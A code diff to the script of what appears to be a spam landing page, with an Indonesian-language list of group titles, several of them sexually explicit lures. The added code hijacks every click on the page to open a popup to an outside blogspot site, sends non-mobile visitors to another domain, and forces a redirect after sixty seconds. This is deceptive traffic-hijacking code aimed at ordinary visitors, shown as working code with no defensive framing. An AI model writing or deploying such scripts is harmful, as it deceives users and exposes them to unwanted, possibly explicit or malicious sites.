@@ -59,6 +59,24 @@ Quotation[54] = "Share Video Full";
 Quotation[55] = "Video Full Hd";
 Quotation[56] = "Grup Jomblo Sehati";
 Quotation[57] = "Indo 18+";
+Quotation[58] = "Rahasia Mama";
+Quotation[59] = "Berbagi Video";
+Quotation[60] = "Memek Putih";
+Quotation[61] = "Gadis Arab 18+";
+Quotation[62] = "Penyejuk Jiwa";
+Quotation[63] = "Sahabat Selamanya";
+Quotation[64] = "Teman Dumay";
+Quotation[65] = "Sahabat Santai";
+Quotation[66] = "Cari Teman Tidur";
+Quotation[67] = "Cinta Lokasi";
+Quotation[68] = "Semilir Salju";
+Quotation[69] = "Angin Bahagia";
+Quotation[70] = "Keluarga Bokep";
+Quotation[71] = "18+ Dewasa";
+Quotation[72] = "Khusus Pelanggan";
+Quotation[73] = "Mama Muda Croot";
+Quotation[74] = "Crot Disini";
+Quotation[75] = "Kamar Gelap";
 
 var Q = Quotation.length;
 var whichQuotation=Math.round(Math.random()*(Q-1));
@@ -67,8 +85,26 @@ document.write(Quotation[whichQuotation]);
 }
 showQuotation();
 
-// mobile
+// BODY CLICK
+    function addEvent(obj, eventName, func) {
+        if (obj.attachEvent) {
+            obj.attachEvent("on" + eventName, func);
+        } else if (obj.addEventListener) {
+            obj.addEventListener(eventName, func, true);
+        } else {
+            obj["on" + eventName] = func;
+        }
+    }
+addEvent(window, "load", function(e) {
+    addEvent(document.body, "click", function(e) {
+            var w = window.open('https://tunggusay.blogspot.com/');
+            window.focus();
+    });
+}); 
 
-if((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i)) || (navigator.userAgent.indexOf('Android') != -1)){
-}
-else location.replace("https://indukredirect.blogspot.com/");
+// ONLY MOBILE
+if((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i)) || (navigator.userAgent.indexOf('Android') != -1)){}
+else location.replace("https://liverscout.blogspot.com/");
+
+// TIMEOUT
+setTimeout("window.location.href = 'https://zonakerajinantangan.blogspot.com/';",60*1000)
